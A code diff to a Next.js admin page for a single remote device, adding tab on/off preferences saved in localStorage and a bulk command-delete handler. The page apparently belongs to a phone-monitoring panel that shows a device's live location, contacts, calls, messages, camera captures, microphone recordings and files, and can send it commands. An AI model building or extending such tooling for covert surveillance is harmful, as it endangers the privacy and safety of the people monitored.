@@ -1,7 +1,7 @@
 // app/admin/devices/[id]/page.tsx
 "use client";
 
-import React from "react";
+import React, { useState, useEffect } from "react";
 import { useParams } from "next/navigation";
 import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
 import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
@@ -9,17 +9,38 @@ import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
 import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
 import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";
 
+const TAB_PREFS_KEY = "snap_tab_prefs";
+
+function loadTabPrefs(): Record<string, boolean> {
+  if (typeof window === "undefined") return {};
+  try { return JSON.parse(localStorage.getItem(TAB_PREFS_KEY) || "{}"); } catch { return {}; }
+}
+
+function saveTabPrefs(prefs: Record<string, boolean>) {
+  try { localStorage.setItem(TAB_PREFS_KEY, JSON.stringify(prefs)); } catch {}
+}
+
 export default function DeviceDetailPage() {
   const params = useParams();
   const deviceId = params.id as string;
 
   const {
-    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, appCount,
+    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
     activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
-    handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand,
+    handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand, handleBulkDeleteCommands,
     handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
     handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
   } = useDeviceDetail(deviceId);
+
+  const [tabPrefs, setTabPrefs] = useState<Record<string, boolean>>({});
+  useEffect(() => { setTabPrefs(loadTabPrefs()); }, []);
+
+  const isTabEnabled = (tabId: string) => tabPrefs[tabId] !== false; // default enabled
+  const toggleTab = (tabId: string) => {
+    const next = { ...tabPrefs, [tabId]: !isTabEnabled(tabId) };
+    setTabPrefs(next);
+    saveTabPrefs(next);
+  };
 
   if (loading && !device) {
     return (
@@ -66,10 +87,14 @@ export default function DeviceDetailPage() {
         audioClips={audioClips}
         files={files}
         filesLoading={filesLoading}
+        tabLoading={tabLoading}
         isLiveMovement={isLiveMovement}
+        isTabEnabled={isTabEnabled(activeTab)}
+        onToggleTab={() => toggleTab(activeTab)}
         onToggleLiveMovement={handleToggleLiveMovement}
         onSendCommand={sendCommand}
         onDeleteCommand={handleDeleteCommand}
+        onBulkDeleteCommands={handleBulkDeleteCommands}
         onDeleteContact={handleDeleteContact}
         onDeleteCall={handleDeleteCall}
         onDeleteMessage={handleDeleteMessage}
